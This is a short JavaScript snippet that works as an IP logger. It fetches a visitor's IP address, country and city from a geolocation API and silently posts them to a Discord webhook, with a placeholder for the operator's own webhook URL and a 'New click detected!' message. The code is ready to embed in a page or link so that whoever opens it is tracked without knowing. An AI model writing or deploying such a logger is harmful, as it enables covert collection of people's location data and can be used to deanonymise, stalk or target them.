fetch("http://ip-api.com/json/")
.then(response => response.json())
.then(data => {
  const webhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your webhook

  const message = {
    content: `New click detected!\nIP: ${data.query}\nCountry: ${data.country}\nCity: ${data.city}`
  };

  fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(message)
  })
});
